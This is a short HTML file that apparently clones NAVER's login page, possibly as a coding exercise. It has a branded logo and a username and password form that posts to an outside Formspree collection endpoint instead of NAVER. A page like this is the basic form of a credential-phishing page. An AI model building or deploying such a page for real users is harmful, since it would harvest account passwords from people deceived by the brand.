<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login-clone</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <main>
        <h1 class="logo">
            <a href="#">
                <img src="../images/logo.svg" alt="NAVER logo">
            </a>
        </h1>
        <form action="https://formspree.io/f/moqpobjy" class="login-form">
            <fieldset>
                <legend>로그인 폼</legend>
                <div class="user-id">
                    <label for="userId">아이디</label>
                    <input type="text" id="userId" name="userId" required placeholder="아이디">
                  </div>
                  <div class="user-pw">
                    <label for="userPw">비밀번호</label>
                    <input type="password" id="userPw" name="userPw" required placeholder="비밀번호">
                  </div>
                  
            </fieldset>
        </form>
    </main>

</body>
</html>
